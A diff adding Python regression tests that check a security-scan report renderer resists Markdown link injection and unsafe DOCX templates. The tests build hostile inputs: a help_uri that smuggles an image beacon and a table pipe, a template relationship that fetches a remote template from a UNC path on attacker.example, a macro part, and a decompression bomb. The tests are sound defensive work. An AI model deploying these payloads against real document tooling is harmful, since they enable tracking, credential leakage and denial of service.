@@ -200,6 +200,24 @@ class MarkdownTests(unittest.TestCase):
         unescaped = re.findall(r"(?<!\\)\|", row)
         self.assertEqual(len(unescaped), 10)
 
+    def test_help_links_cannot_inject_markdown(self):
+        # Regression (security review F3): help_uri comes from imported reports and was placed in
+        # Markdown links unencoded, allowing image beacons and table-cell spoofing.
+        report = load()
+        finding = by_rule(report, "G204")
+        finding["help_uri"] = 'https://a.example/x)![t](https://tracker.example/p.png|cell"title\'`'
+        text = reports.render(report, "markdown").decode("utf-8")
+        self.assertNotIn("![t]", text)
+        self.assertNotIn("](https://tracker.example", text)
+        row = next(line for line in text.splitlines() if line.startswith("| High | [gosec"))
+        self.assertEqual(len(re.findall(r"(?<!\\)\|", row)), 10)
+        self.assertIn("https://a.example/x%29!%5Bt%5D%28https://tracker.example/p.png%7Ccell%22title%27%60", row)
+        rules = json.loads(reports.render(report, "sarif"))["runs"][0]["tool"]["driver"]["rules"]
+        markdown = next(r for r in rules if r["id"] == "gosec/G204")["help"]["markdown"]
+        self.assertEqual(markdown.count("]("), 1)
+        self.assertNotIn("![", markdown)
+        self.assertNotIn("|", markdown)
+
     def test_sections_and_executive_variant(self):
         report = load()
         text = reports.render(report, "markdown").decode("utf-8")
@@ -354,6 +372,46 @@ class DocxTests(unittest.TestCase):
         with mock.patch.dict(sys.modules, {"docx": None}):
             with self.assertRaisesRegex(ValueError, r"crab-risk-scan\[docx\]"):
                 reports.render(report, "docx")
+
+    def rewrite(self, source, target, *, add=None, replace=None):
+        """Copy a DOCX, optionally adding parts or rewriting one part's bytes."""
+        with zipfile.ZipFile(source) as archive, zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as out:
+            for info in archive.infolist():
+                data = archive.read(info)
+                if replace and info.filename == replace[0]:
+                    data = replace[1](data)
+                out.writestr(info.filename, data)
+            for name, data in (add or {}).items():
+                out.writestr(name, data)
+        return target
+
+    def test_template_safety_checks(self):
+        # Regression (security review F6): custom templates were loaded without an expansion limit
+        # and external parts (remote templates, images, UNC targets) were copied into reports.
+        report = load()
+        with tempfile.TemporaryDirectory() as folder:
+            base = self.make_template(folder)
+            rels = "word/_rels/document.xml.rels"
+            external = (b'<Relationship Id="rIdX" TargetMode="External" Target="\\\\attacker.example\\t.dotm" '
+                        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"/>')
+            hyperlink = (b'<Relationship Id="rIdY" Target="https://example.com/" TargetMode="External" '
+                         b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/>')
+            remote = self.rewrite(base, Path(folder) / "remote.docx",
+                                  replace=(rels, lambda data: data.replace(b"</Relationships>",
+                                                                           external + b"</Relationships>")))
+            with self.assertRaisesRegex(ValueError, "external content"):
+                reports.render(report, "docx", template=remote)
+            linked = self.rewrite(base, Path(folder) / "linked.docx",
+                                  replace=(rels, lambda data: data.replace(b"</Relationships>",
+                                                                           hyperlink + b"</Relationships>")))
+            self.docx.Document(io.BytesIO(reports.render(report, "docx", template=linked)))
+            macro = self.rewrite(base, Path(folder) / "macro.docx", add={"word/vbaProject.bin": b"\0" * 16})
+            with self.assertRaisesRegex(ValueError, "macros"):
+                reports.render(report, "docx", template=macro)
+            bomb = self.rewrite(base, Path(folder) / "bomb.docx", add={"word/media/filler.bin": b"\0" * (3 << 20)})
+            with mock.patch("crab_risk_scan.reports.docx_report.TEMPLATE_EXPANDED_LIMIT", 2 << 20):
+                with self.assertRaisesRegex(ValueError, "expands beyond"):
+                    reports.render(report, "docx", template=bomb)
 
 
 class CodeQualityTests(unittest.TestCase):
